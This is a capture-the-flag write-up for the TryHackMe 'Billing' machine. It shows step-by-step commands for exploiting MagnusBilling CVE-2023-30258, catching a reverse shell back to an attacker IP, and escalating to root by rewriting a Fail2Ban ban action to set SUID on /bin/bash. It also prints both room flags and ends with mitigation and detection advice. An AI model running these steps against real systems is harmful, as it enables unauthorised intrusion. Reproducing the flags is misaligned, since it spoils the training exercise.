# Billing - TryHackMe Writeup

## Basic Information

| Category | Details |
|----------|----------|
| Platform | TryHackMe |
| Machine Name | Billing |
| Difficulty | Easy |
| Operating System | Linux |
| Target IP | 10.49.154.100 |

---

# Introduction

Today we are back with another **TryHackMe Easy** machine named **Billing**.

The target simulates a vulnerable VoIP billing server running **MagnusBilling**, an open-source billing and call management platform built on top of **Asterisk PBX**. The challenge demonstrates how publicly known vulnerabilities can quickly lead to complete system compromise when organizations fail to patch exposed applications.

During this assessment we begin with traditional reconnaissance, enumerate the exposed services, identify a vulnerable MagnusBilling installation, exploit a known **Remote Command Injection vulnerability (CVE-2023-30258)** to obtain a reverse shell, and finally escalate privileges through a misconfigured **Fail2Ban** sudo permission.

Unlike many beginner machines that rely on guessing or brute forcing credentials, Billing focuses on vulnerability research, public exploit usage, and Linux privilege escalation.

---

# Scenario

The objective of this machine is straightforward:

- Enumerate exposed services.
- Identify the vulnerable application.
- Gain an initial foothold.
- Capture the User Flag.
- Escalate privileges.
- Capture the Root Flag.

---

# Attack Methodology

The complete attack path followed throughout this assessment is shown below.

```
Reconnaissance
        │
        ▼
Port Enumeration
        │
        ▼
Service Enumeration
        │
        ▼
Website Analysis
        │
        ▼
MagnusBilling Discovery
        │
        ▼
Vulnerability Research
        │
        ▼
CVE-2023-30258
        │
        ▼
Command Injection
        │
        ▼
Reverse Shell
        │
        ▼
Shell Stabilization
        │
        ▼
User Enumeration
        │
        ▼
User Flag
        │
        ▼
Privilege Escalation
        │
        ▼
Root
```

---

# Initial Reconnaissance

As always, the first step during any penetration test is identifying the services exposed by the target.

A complete TCP scan is performed using Nmap.

```bash
nmap -p- 10.49.154.100
```

## Scan Results

```
22/tcp
80/tcp
3306/tcp
5038/tcp
```

Only four ports are open.

- SSH
- HTTP
- MySQL
- Asterisk Call Manager

The presence of both **MySQL** and **Asterisk** immediately suggests that the target may be hosting a VoIP or PBX management application.

---

# Service Enumeration

After identifying the open ports, a more detailed scan is performed.

```bash
nmap -sC -sV 10.49.154.100
```

The results reveal:

```
22/tcp
OpenSSH 9.2p1

80/tcp
Apache 2.4.62

3306/tcp
MariaDB

5038/tcp
Asterisk Call Manager
```

Important observations include:

- Modern Debian server
- Apache web server
- MariaDB backend database
- Asterisk telephony service

The HTTP service appears to be the most promising attack vector.

---

# Website Enumeration

Before accessing the website, a hostname is added locally.

```
10.49.154.100 billing.thm
```

Updating `/etc/hosts` allows the application to be accessed using its intended hostname.

Browsing the website immediately redirects to:

```
/mbilling
```

This reveals a login portal.

The page branding identifies the application as:

```
MagnusBilling
```

At this stage no credentials are available, therefore further investigation is required.

---

# Understanding MagnusBilling

MagnusBilling is an open-source VoIP billing platform used to manage:

- SIP accounts
- Customer billing
- Call routing
- Asterisk PBX integration
- Telephony services

Since this is a well-known application, the next logical step is checking whether any publicly disclosed vulnerabilities affect the installed version.

Searching public resources quickly reveals a highly critical vulnerability.

---

# CVE-2023-30258

Research identifies the following public exploit.

```
CVE-2023-30258
```

This vulnerability affects MagnusBilling Version 7.

A publicly available exploit demonstrates that the application suffers from **Remote Command Injection** through the following endpoint.

```
icepay.php
```

Because this vulnerability is already publicly documented, exploitation becomes significantly easier.

The exploit repository used during the assessment is:

```
https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit
```

The exploit abuses insufficient input validation, allowing arbitrary shell commands to be executed directly on the underlying operating system.

---

# Exploiting CVE-2023-30258

The exploit script is executed against the target.

```bash
python3 exploit.py \
-t billing.thm \
-a <ATTACKER-IP> \
-p 4444
```

Example:

```bash
python3 exploit.py \
-t billing.thm \
-a 192.168.138.6 \
-p 4444
```

The exploit sends a malicious payload to:

```
/mbilling/lib/icepay/icepay.php
```

The payload creates a reverse shell back to the attacker's machine.

Although the exploit eventually reports a timeout, this behavior is expected.

A timeout often indicates that the vulnerable application is still processing the injected command rather than returning a normal HTTP response.

---

# Preparing the Listener

Before executing the exploit, a Netcat listener is started.

```bash
nc -lvnp 4444
```

Moments later the target connects back.

```
connect to [ATTACKER-IP]
```

An interactive shell is obtained.

Checking the current user confirms successful code execution.

```bash
whoami
```

Output

```
asterisk
```

The machine has now been successfully compromised.

---

# Understanding the Initial Foothold

The reverse shell executes under the **asterisk** service account because the vulnerable MagnusBilling application itself runs using that account.

This is common in web application exploitation.

Rather than obtaining root immediately, attackers usually inherit the permissions of the vulnerable service.

The next objective therefore becomes local enumeration and privilege escalation.

---

# Shell Stabilization

Reverse shells obtained through command injection usually have several limitations.

Examples include:

- Broken terminal
- No command history
- No job control
- Limited interactive functionality

To obtain a fully interactive shell, Python is used.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After suspending the shell using:

```
CTRL + Z
```

The local terminal is configured.

```bash
stty raw -echo
```

The session is then resumed.

```bash
fg
```

Finally the terminal type is exported.

```bash
export TERM=xterm
```

The shell now behaves similarly to a normal SSH session, making further enumeration significantly easier.

---

# Local Enumeration

With a stable shell available, local enumeration begins.

Important information gathered includes:

- Current user
- Running services
- Home directories
- Accessible files
- Sudo permissions
- Installed applications

One of the first places to inspect is the users' home directories.

Inside:

```
/home/magnus
```

the user flag is discovered.

---

# User Flag

Reading the flag.

```bash
cat user.txt
```

Output

```
THM{4a6831d5f124b25eefb1e92e0f0da4ca}
```

The initial objective has now been completed.

---

# Current Progress

At this stage we have successfully:

- Enumerated all exposed services.
- Identified the MagnusBilling application.
- Researched publicly disclosed vulnerabilities.
- Confirmed the presence of CVE-2023-30258.
- Achieved Remote Command Execution.
- Obtained a reverse shell as the **asterisk** user.
- Stabilized the shell.
- Performed local enumeration.
- Captured the User Flag.

The remaining task is escalating privileges to root. In the next part, we will discover that the **asterisk** account has passwordless access to **Fail2Ban**, abuse its action configuration to execute arbitrary commands as root, obtain a privileged shell, capture the Root Flag, and conclude the machine with security analysis and mitigation recommendations.

# Privilege Escalation

After obtaining the initial shell as the **asterisk** user and capturing the user flag, the final objective is escalating privileges to **root**.

The first step in any Linux privilege escalation assessment is checking whether the current user has any sudo permissions.

```bash
sudo -l
```

The output reveals:

```
Matching Defaults entries for asterisk:

env_reset
mail_badpass
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Runas and Command-specific defaults:

Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands:

(ALL) NOPASSWD: /usr/bin/fail2ban-client
```

This is an extremely interesting finding.

Although the user cannot execute arbitrary commands using sudo, they are allowed to run **fail2ban-client** as **root** without requiring a password.

This immediately becomes the primary privilege escalation vector.

---

# Understanding Fail2Ban

Before exploiting the configuration, it is useful to understand what Fail2Ban actually does.

Fail2Ban is a security tool that monitors log files for suspicious behaviour.

When repeated failed authentication attempts are detected, it automatically performs defensive actions such as:

- Blocking IP addresses
- Updating firewall rules
- Executing custom scripts
- Running administrator-defined actions

Internally, every jail contains one or more **actions**.

These actions are simply commands executed by Fail2Ban whenever a specific event occurs.

If an attacker can modify those actions, arbitrary commands may execute with root privileges.

---

# Enumerating Available Actions

The configured actions for the Asterisk jail are inspected.

```bash
sudo /usr/bin/fail2ban-client get asterisk-iptables actions
```

Output:

```
iptables-allports-ASTERISK
```

The jail currently uses a single action named:

```
iptables-allports-ASTERISK
```

Since the user has unrestricted access to **fail2ban-client**, the action itself can be modified.

---

# Abusing Fail2Ban Actions

Instead of allowing the normal firewall command to execute, the action is replaced with our own command.

```bash
sudo /usr/bin/fail2ban-client \
set asterisk-iptables \
action \
iptables-allports-ASTERISK \
actionban \
'chmod +s /bin/bash'
```

This changes the **ban action** into:

```bash
chmod +s /bin/bash
```

Rather than banning an IP address, Fail2Ban will now set the **SUID** permission on the Bash binary.

This is possible because Fail2Ban executes its actions with root privileges.

---

# Triggering the Action

The modified action still needs to be executed.

This is accomplished by banning any IP address.

```bash
sudo /usr/bin/fail2ban-client \
set asterisk-iptables \
banip 127.0.0.1
```

Output:

```
1
```

Although banning localhost is meaningless from a security perspective, it forces Fail2Ban to execute the modified action.

The following command is therefore executed as root:

```bash
chmod +s /bin/bash
```

At this point the Bash executable has obtained the SUID bit.

---

# Understanding the SUID Bit

The **Set User ID (SUID)** permission allows an executable to run using the permissions of its owner rather than the user executing it.

Normally:

```
asterisk

↓

bash

↓

asterisk
```

After enabling SUID:

```
asterisk

↓

bash (SUID)

↓

root
```

This effectively allows any user executing the modified Bash binary to obtain a root shell.

---

# Obtaining Root

Executing Bash with the **-p** option preserves elevated privileges.

```bash
/bin/bash -p
```

Checking the current user:

```bash
whoami
```

Output:

```
root
```

The machine has now been fully compromised.

---

# Root Flag

Navigating to the root directory:

```bash
cd /root
```

Reading the final flag:

```bash
cat root.txt
```

Output:

```
THM{33ad5b530e71a172648f424ec23fae60}
```

Both objectives have now been completed successfully.

---

# Complete Attack Path

```
Internet
      │
      ▼
Nmap Scan
      │
      ▼
Apache Web Server
      │
      ▼
MagnusBilling
      │
      ▼
Version Research
      │
      ▼
CVE-2023-30258
      │
      ▼
Command Injection
      │
      ▼
Reverse Shell
      │
      ▼
Shell Stabilization
      │
      ▼
asterisk User
      │
      ▼
sudo -l
      │
      ▼
Fail2Ban Misconfiguration
      │
      ▼
Overwrite Action
      │
      ▼
Trigger Ban Action
      │
      ▼
chmod +s /bin/bash
      │
      ▼
SUID Bash
      │
      ▼
Root Shell
      │
      ▼
Root Flag
```

---

# Security Weaknesses Identified

## 1. Outdated MagnusBilling Installation

The publicly accessible MagnusBilling application was vulnerable to **CVE-2023-30258**, allowing unauthenticated command injection.

**Impact**

- Remote Code Execution
- Complete server compromise
- Initial foothold without valid credentials

**Mitigation**

- Regularly update MagnusBilling.
- Subscribe to vendor security advisories.
- Remove vulnerable software versions immediately.

---

## 2. Publicly Accessible Administrative Application

The MagnusBilling portal was directly accessible from the network.

**Impact**

- Increased attack surface.
- Easier reconnaissance.
- Public exploitation of known vulnerabilities.

**Mitigation**

- Restrict access using VPNs or internal networks.
- Apply IP allowlisting where possible.
- Implement Web Application Firewalls (WAFs).

---

## 3. Remote Command Injection

User input reaching the vulnerable `icepay.php` endpoint was not properly validated.

**Impact**

- Arbitrary command execution.
- Reverse shell.
- Full application compromise.

**Mitigation**

- Validate and sanitize all user input.
- Avoid executing shell commands with user-controlled data.
- Use parameterized APIs instead of shell execution.

---

## 4. Excessive sudo Permissions

The **asterisk** service account was allowed to execute **fail2ban-client** as root without a password.

**Impact**

- Local privilege escalation.
- Complete system compromise.

**Mitigation**

- Follow the Principle of Least Privilege.
- Avoid granting unrestricted access to administrative tools.
- Periodically review sudoers configurations.

---

## 5. Fail2Ban Action Abuse

Fail2Ban actions execute with root privileges.

Because the attacker could modify these actions, arbitrary commands executed as root.

**Impact**

- Privilege escalation.
- Persistent root access.
- Arbitrary code execution.

**Mitigation**

- Restrict access to Fail2Ban configuration.
- Prevent untrusted users from modifying jail actions.
- Monitor Fail2Ban configuration changes.

---

# MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|------------|-----------|
| Exploit Public-Facing Application | T1190 |
| Command and Scripting Interpreter (Unix Shell) | T1059.004 |
| Exploitation for Privilege Escalation | T1068 |
| Abuse Elevation Control Mechanism (Sudo) | T1548.003 |
| Valid Accounts | T1078 |

---

# Detection Opportunities

Security teams can identify similar attacks by monitoring:

- Unexpected requests to vulnerable application endpoints.
- Web server logs containing suspicious command injection payloads.
- Outbound reverse shell connections.
- Unusual execution of `fail2ban-client`.
- Modifications to Fail2Ban jail actions.
- Unexpected changes to SUID permissions on critical binaries.
- Execution of `/bin/bash -p`.

Modern Endpoint Detection and Response (EDR) solutions should alert on SUID modifications and privilege escalation attempts involving administrative security tools.

---

# Lessons Learned

Billing demonstrates how a single unpatched application can expose an entire Linux server to compromise.

The attack required no password guessing or brute-force techniques. Instead, publicly available vulnerability research quickly led to reliable Remote Code Execution.

Equally important, the privilege escalation phase highlights the risks of granting excessive sudo permissions to service accounts. While Fail2Ban is designed as a defensive tool, incorrect sudo configurations transformed it into a privilege escalation mechanism.

The machine reinforces several important penetration testing concepts:

- Thorough service enumeration often reveals the application's purpose.
- Public vulnerability research should always follow application fingerprinting.
- Reverse shell stabilization greatly improves post-exploitation workflow.
- Service accounts should never possess unnecessary administrative privileges.
- Security tools themselves can become attack vectors when misconfigured.

---

# Conclusion

Billing is an excellent beginner-friendly machine that combines realistic web application exploitation with Linux privilege escalation. The compromise begins by identifying an outdated MagnusBilling installation vulnerable to **CVE-2023-30258**, allowing unauthenticated command injection and a reverse shell as the **asterisk** service account.

Following initial access, local enumeration reveals a dangerous sudo misconfiguration permitting passwordless execution of **fail2ban-client**. By replacing a Fail2Ban ban action with a malicious command, the Bash binary is granted the SUID bit, ultimately providing a root shell and complete control over the system.

From a defensive standpoint, this challenge emphasizes the importance of maintaining up-to-date software, restricting administrative interfaces, applying the principle of least privilege, and carefully reviewing sudo permissions granted to service accounts. It also illustrates how defensive utilities such as Fail2Ban can become privilege escalation vectors when improperly configured.

Overall, Billing provides an excellent introduction to vulnerability research, public exploit usage, post-exploitation techniques, and Linux privilege escalation, making it a valuable exercise for anyone developing practical penetration testing skills.
